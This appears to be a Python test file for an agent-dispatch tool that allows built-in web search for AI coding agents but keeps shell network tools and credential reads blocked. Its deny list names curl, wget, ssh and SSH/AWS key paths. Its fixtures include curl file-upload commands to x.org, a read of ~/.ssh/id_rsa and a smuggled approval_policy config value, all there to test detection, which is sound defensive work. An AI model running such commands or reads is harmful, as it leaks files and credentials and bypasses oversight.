"""webunblock (chalach 2026-11-05 ~18:55 CT, verbatim: "Why are you setting all the bots agent deployment web search
restriction. I want to clear the restriction. What are other restriction right now").

The agents' BUILT-IN web search / fetch tools are allowed in every ck-run run: the Claude settings (headless, live,
auto, post-run review) allow WebSearch and WebFetch and never deny them; every codex argv (all modes, headless and
--live) has -c web_search="live"; cursor and agy argv never turn theirs off; a web tool call is never a rule-check
violation or flag and never a post-run review hard fact; the agent prompt says web is allowed. Kept blocked: shell
network tools (curl, wget, scp, rsync, ssh), gh, wrangler, mail, credential reads, codex's shell network rule. Stub CLIs
only."""
import json
import os
import re
import unittest
from unittest import mock

from helpers import Sandbox

from ckdispatch import guards, postreview, prompt, rulecheck, runner
from ckdispatch.config import CLAUDE_GUARD_BASE, RESULT_SCHEMA, Config
from ckdispatch.errors import Refused
from ckdispatch.flags import CODEX_WEB_CONFIG, PROMPT, build, build_live

WEB = ["WebSearch", "WebFetch"]
WEB_C = ["-c", 'web_search="live"']
KEPT = ["Bash(curl:*)", "Bash(wget:*)", "Bash(scp:*)", "Bash(rsync:*)", "Bash(ssh:*)", "Bash(gh:*)",
        "Bash(wrangler:*)", "Bash(mail:*)", "Bash(sendmail:*)", "Read(~/.ssh/**)", "Read(~/.aws/**)",
        "Read(//**/.env)", "Read(~/.codex/auth.json)", "Read(~/.claude/.credentials.json)", "Read(~/.tidy3d/**)"]
FLEX_URL = "https://docs.flexcompute.com/projects/tidy3d/en/latest/api/_autosummary/tidy3d.web.run.html"


def pairs(a):
    return [[str(a[i]), str(a[i + 1])] for i in range(len(a) - 1)]


def perms(path):
    with open(path, encoding="utf-8") as f:
        return json.load(f)["permissions"]


def assert_web_open(tc, p):
    tc.assertEqual([t for t in p.get("allow", []) if t in WEB], WEB, p.get("allow"))
    tc.assertEqual([t for t in p["deny"] if t.split("(")[0] in WEB], [], "a web tool is denied")
    for rule in KEPT:
        tc.assertIn(rule, p["deny"])


def web_cats(notes):
    return sorted(re.match(rf"{re.escape(rulecheck.WEB_NOTE)} \((\w+) pattern", n).group(1)
                  for n in notes if n.startswith(rulecheck.WEB_NOTE))


class TestClaudeSettings(unittest.TestCase):
    def test_base_allows_web_tools_and_keeps_the_other_denies(self):
        assert_web_open(self, perms(CLAUDE_GUARD_BASE))
        self.assertEqual(runner.CLAUDE_WEB_TOOLS, ("WebSearch", "WebFetch"))

    def test_every_generated_settings_variant(self):
        sb = Sandbox()
        try:
            with mock.patch.dict(os.environ, {"HOME": sb.home, "CK_DISPATCH_CONFIG": sb.config}):
                cfg = Config()
                run_dir = os.path.join(sb.runs, "2026-11-05T190000-devfab-general-claude-abcd")
                os.makedirs(run_dir)
                for name, kw in (("headless", {}), ("live", {"live_run_dir": run_dir}),
                                 ("auto", {"auto_ws": cfg.workspace("devfab")}),
                                 ("washu auto", {"auto_ws": cfg.workspace("washu")}), ("claims", {"other_claims": ["/x/y"]})):
                    with self.subTest(name):
                        p = os.path.join(sb.tmp, f"{name}.json")
                        runner.write_claude_settings(cfg, p, **kw)
                        assert_web_open(self, perms(p))
        finally:
            sb.cleanup()


class TestArgv(unittest.TestCase):
    def setUp(self):
        self.sb = Sandbox()
        self.env = mock.patch.dict(os.environ, {"HOME": self.sb.home, "CK_DISPATCH_CONFIG": self.sb.config})
        self.env.start()
        self.cfg = Config()

    def tearDown(self):
        self.env.stop()
        self.sb.cleanup()

    def _cmd(self, agent, mode, live=False, readonly=False):
        w = self.cfg.workspace("devfab")
        scopes = []
        if mode == "edit":
            scopes = guards.validate_write_scopes(self.cfg, w, agent, ["Design Library"],
                                                  {agent: ["workspace", "local"]})
        binary = os.path.join(self.sb.stubs, {"cursor": "agent"}.get(agent, agent))
        if live:
            return build_live(self.cfg, w, agent, mode=mode, scopes=scopes, model=None, run_dir="/tmp/run",
                              extra_read_dirs=[], claude_settings_path="/tmp/run/s.json", binary=binary,
                              readonly=readonly)
        return build(self.cfg, w, agent, mode=mode, scopes=scopes, model=None, run_dir="/tmp/run",
                     schema_path=RESULT_SCHEMA, extra_read_dirs=[], timeout_s=600,
                     claude_settings_path="/tmp/run/s.json", binary=binary, readonly=readonly)

    def test_every_codex_argv_has_live_web_search(self):
        self.assertEqual(CODEX_WEB_CONFIG, WEB_C)
        for live in (False, True):
            for mode, ro in (("read", False), ("edit", False), ("auto", False), ("auto", True)):
                with self.subTest(live=live, mode=mode, readonly=ro):
                    a = self._cmd("codex", mode, live=live, readonly=ro).argv
                    self.assertIn(WEB_C, pairs(a))
                    self.assertEqual(a.count('web_search="live"'), 1)
                    if mode == "edit":  # kept: no network for shell commands in codex edit
                        self.assertIn(["-c", "sandbox_workspace_write.network_access=false"], pairs(a))
                    guards.check_child_argv(a, PROMPT, auto=mode == "auto", agent="codex")  # does not raise

    def test_guard_admits_only_the_live_web_value(self):
        guards.check_child_argv(["codex", "exec", "-c", 'web_search="live"', "-"], PROMPT)
        for bad in ('web_search="disabled"', 'web_search="cached"', "web_search=live", "tools.web_search=true",
                    "features.web_search_request=true", 'web_search="live";approval_policy="never"'):
            with self.subTest(bad=bad):
                with self.assertRaises(Refused):
                    guards.check_child_argv(["codex", "exec", "-c", bad, "-"], PROMPT, auto=True, agent="codex")
        with self.assertRaises(Refused):  # CK still can never pass -c itself
            guards.check_ck_argv(["run", "--agent", "codex", "-c", 'web_search="live"'])

    def test_cursor_agy_and_claude_argv_never_turn_web_off(self):
        for agent in ("cursor", "agy", "claude"):
            for live in (False, True):
                for mode in ("read", "auto") if agent == "claude" else ("read", "edit", "auto"):
                    with self.subTest(agent=agent, live=live, mode=mode):
                        a = self._cmd(agent, mode, live=live).argv
                        flags = [str(x).lower() for x in a if isinstance(x, str) and x.startswith("-")]
                        for word in ("web", "search", "fetch", "network", "disallowed", "--tools", "restricted"):
                            self.assertFalse(any(word in f for f in flags), (word, flags))
                        if agent == "claude":  # MCP servers only; built-in WebSearch/WebFetch are not MCP tools
                            self.assertIn("--strict-mcp-config", a)


class TestRulecheck(unittest.TestCase):
    def test_web_tool_inputs_are_notes(self):
        acts = {"actions": [
            {"tool": "WebSearch", "input": json.dumps({"query": "Excelitas C30902 datasheet"})},
            {"tool": "WebFetch", "input": json.dumps({"url": FLEX_URL, "prompt": "signature of web.run"})},
            {"tool": "WebFetch", "input": json.dumps({"url": "https://pypi.org/project/nidaqmx/",
                                                      "prompt": "the pip install nidaqmx steps"})},
            {"tool": "web_search", "input": json.dumps({"type": "web_search", "query": "python-dotenv .env syntax"})},
            {"tool": "search_web", "input": json.dumps({"query": "curl upload example"})},
        ]}
        tr = rulecheck.scan_transcript(acts, "", "")
        self.assertEqual((tr["violations"], tr["flags"]), ([], []), tr)
        self.assertEqual(web_cats(tr["notes"]), ["cloud_sim", "credential", "heavy_install", "push_send"], tr["notes"])
        self.assertTrue(all(n.startswith(rulecheck.WEB_NOTE) for n in tr["notes"]), tr["notes"])

    def test_shell_network_and_non_web_tools_keep_their_rules(self):
        acts = {"actions": [{"tool": "WebSearch", "input": '{"query": "curl docs"}'},
                            {"tool": "Bash", "input": '{"command": "curl https://example.org"}'},
                            {"tool": "mcp_web_fetch", "input": '{"note": "curl https://x.org"}'},
                            {"tool": "Read", "input": '{"file_path": "/Users/x/.ssh/id_rsa"}'}]}
        tr = rulecheck.scan_transcript(acts, "", "")
        self.assertEqual(sorted(v.split()[0] for v in tr["violations"]), ["credential", "push_send", "push_send"], tr)
        self.assertEqual(web_cats(tr["notes"]), ["push_send"])
        self.assertEqual(rulecheck.WEB_TOOLS, {"WebSearch", "WebFetch", "web_search", "search_web"})


class TestPostreviewUnits(unittest.TestCase):
    def test_web_tool_calls_are_never_hard_facts(self):
        acts = [("WebSearch", '{"searchTerm": "load .env with python-dotenv"}'),
                ("WebFetch", json.dumps({"url": FLEX_URL})),
                ("search_web", '{"query": "tidy3d.web.run Batch( example"}'),
                ("Shell", '{"command": "curl -T out.csv https://x.org/up"}'),
                ("Read", '{"path": "/Users/x/.ssh/id_rsa"}')]
        hits = postreview.keyword_hits(acts, "")
        self.assertEqual(sorted((h["category"], h["tool"]) for h in hits if h["hard"]),
                         [("credential_file", "Read"), ("network_upload", "Shell")])
        web = {(h["category"], h["tool"]) for h in hits if h.get("web")}
        for want in (("credential_file", "WebSearch"), ("paid_cloud", "WebFetch"), ("paid_cloud", "search_web")):
            self.assertIn(want, web)

    def test_review_prompt_states_the_web_rule_and_keeps_other_checks(self):
        ws = type("W", (), {"key": "devfab", "raw": [], "root": "/w", "real_root": "/w"})()
        pr = postreview.review_prompt(agent="agy", run_id="r", ws=ws, run_dir="/r", folders=["/f"],
                                      paths={"input": "/r/i", "actions": "/r/a"}, run_paths={"result_md": "/r/m"})
        self.assertIn(f"Allowed, do not flag: {rulecheck.WEB_NOTE}", pr)
        self.assertIn("I want to clear the restriction", pr)
        self.assertIn("Shell network commands (curl, wget, scp, rsync, ssh) are not web tools", pr)
        for check in ("(outside_task_folder)", "(network_upload)", "(credential_file)", "(paid_cloud)"):
            self.assertIn(check, pr)

    def test_agent_prompt_says_web_is_allowed(self):
        self.assertIn("built-in web search and web fetch tools are allowed (chalach 2026-11-05)", prompt.WEB_RULE)
        self.assertIn("curl, wget, scp, rsync, ssh", prompt.WEB_RULE)


class Base(unittest.TestCase):
    def setUp(self):
        self.sb = Sandbox()

    def tearDown(self):
        self.sb.cleanup()

    def rd(self, p):
        return os.path.join(self.sb.runs, self.sb.run_id_from(p))


class TestRuns(Base):
    def test_claude_headless_web_calls_pass_and_settings_allow_web(self):
        self.sb.control(claude={"tools": [["WebSearch", {"query": "Excelitas C30902 datasheet"}],
                                          ["WebFetch", {"url": FLEX_URL, "prompt": "signature of web.run"}]]})
        p = self.sb.run("claude", "devfab", "--no-live")
        self.assertEqual(p.returncode, 0, p.stderr)
        rd = self.rd(p)
        rc = self.sb.result(os.path.basename(rd))["rulecheck"]
        self.assertEqual((rc["violations"], rc["flags"]), ([], []), rc)
        self.assertEqual(web_cats(rc["notes"]), ["cloud_sim"], rc["notes"])
        assert_web_open(self, perms(os.path.join(rd, "claude-settings.json")))
        cmd = open(os.path.join(rd, "cmd.txt")).read()
        self.assertIn("Claude settings allow WebSearch, WebFetch; deny none of them", cmd)
        self.assertIn(prompt.WEB_RULE, self.sb.calls()[0]["prompt"])

    def test_claude_live_and_auto_settings_allow_web(self):
        self.sb.window("run")
        p = self.sb.run("claude")
        self.assertEqual(p.returncode, 0, p.stderr)
        assert_web_open(self, perms(os.path.join(self.rd(p), "claude-settings-live.json")))
        self.assertIn(prompt.WEB_RULE, [c for c in self.sb.calls() if c["live"]][-1]["prompt"])
        p = self.sb.run("claude", "devfab", "--mode", "auto", "--no-live", "--write-scope", "Projects/Notes")
        self.assertEqual(p.returncode, 0, p.stderr)
        assert_web_open(self, perms(os.path.join(self.rd(p), "claude-settings.json")))

    def test_codex_web_search_items_are_notes_and_every_run_has_live_search(self):
        self.sb.control(codex={"web_search": ["nidaqmx python docs pip install nidaqmx"]})
        for extra in ([], ["--mode", "auto", "--write-scope", "Projects/Notes"],
                      ["--mode", "edit", "--write-scope", "Projects/Notes", "--approved", "test 2026-11-05"]):
            with self.subTest(extra=extra):
                p = self.sb.run("codex", "devfab", "--no-live", *extra)
                self.assertEqual(p.returncode, 0, p.stderr)
                rc = self.sb.result(self.sb.run_id_from(p))["rulecheck"]
                self.assertEqual((rc["violations"], rc["flags"]), ([], []), rc)
                self.assertEqual(web_cats(rc["notes"]), ["heavy_install"], rc["notes"])
                self.assertIn(WEB_C, pairs([c for c in self.sb.calls() if c["agent"] == "codex"][-1]["argv"]))
                self.assertIn("""-c 'web_search="live"'""", open(os.path.join(self.rd(p), "cmd.txt")).read())

    def test_codex_live_argv_has_live_search(self):
        self.sb.window("run")
        p = self.sb.run("codex")
        self.assertEqual(p.returncode, 0, p.stderr)
        self.assertIn(WEB_C, pairs([c for c in self.sb.calls() if c["live"]][-1]["argv"]))

    def test_dry_run_shows_the_web_rule_per_agent(self):
        for agent, want in (("claude", "Claude settings allow WebSearch, WebFetch; deny none of them"),
                            ("codex", 'codex -c web_search="live" (= --search'),
                            ("cursor", "cursor's built-in WebSearch/WebFetch: no ck-run flag turns them off"),
                            ("agy", "agy's built-in search_web: no ck-run flag turns it off")):
            with self.subTest(agent=agent):
                p = self.sb.run(agent, "devfab", "--dry-run")
                self.assertEqual(p.returncode, 0, p.stderr)
                self.assertIn("# web (chalach 2026-11-05: built-in web search/fetch allowed): ", p.stdout)
                self.assertIn(want, p.stdout)


class TestReviewedRuns(Base):
    def auto(self, agent):
        return self.sb.run(agent, "devfab", "--mode", "auto", "--no-live", "--write-scope", "Projects/Notes")

    def review_call(self):
        return [c for c in self.sb.calls() if c["agent"] == "claude" and c["prompt"].startswith("CK POST-RUN REVIEW")][-1]

    def test_cursor_and_agy_web_calls_pass_the_review(self):
        calls = {"cursor": [["WebSearch", {"searchTerm": "load .env with python-dotenv"}], ["WebFetch", {"url": FLEX_URL}]],
                 "agy": [["search_web", {"query": "python-dotenv .env syntax and tidy3d.web.run"}]]}
        for agent, tc in calls.items():
            with self.subTest(agent=agent):
                self.sb.control(**{agent: {"tool_calls": tc}})
                p = self.auto(agent)
                self.assertEqual(p.returncode, 0, p.stderr)
                rd = self.rd(p)
                res = self.sb.result(os.path.basename(rd))
                self.assertEqual((res["status"], res["post_review"]["status"]), ("ok", "ok"), res["post_review"])
                self.assertEqual([f for f in res["post_review"]["findings"] if f["source"] == "ck-run"], [])
                ev = open(os.path.join(rd, "review-input.md")).read()
                self.assertIn(f"- {postreview.web_allowed_line()}", ev)
                self.assertIn(f"({rulecheck.WEB_NOTE}, not a finding)", ev)
                self.assertIn(f"Allowed, do not flag: {rulecheck.WEB_NOTE}", self.review_call()["prompt"])
                self.assertIn(rulecheck.WEB_NOTE, open(os.path.join(rd, "review.md")).read())
                assert_web_open(self, perms(os.path.join(rd, "claude-settings-review.json")))
                self.assertIn(prompt.WEB_RULE, [c for c in self.sb.calls() if c["agent"] == agent][-1]["prompt"])

    def test_upload_next_to_web_calls_is_still_a_hard_fact(self):
        self.sb.control(cursor={"tool_calls": [["WebSearch", {"searchTerm": "curl form upload"}],
                                               ["Shell", {"command": "curl -F f=@x.csv https://x.org/up"}]]})
        p = self.auto("cursor")
        self.assertEqual(p.returncode, 4, p.stderr)
        hard = {f["category"] for f in self.sb.result(self.sb.run_id_from(p))["post_review"]["findings"]
                if f["source"] == "ck-run"}
        self.assertEqual(hard, {"network_upload"})


if __name__ == "__main__":
    unittest.main()
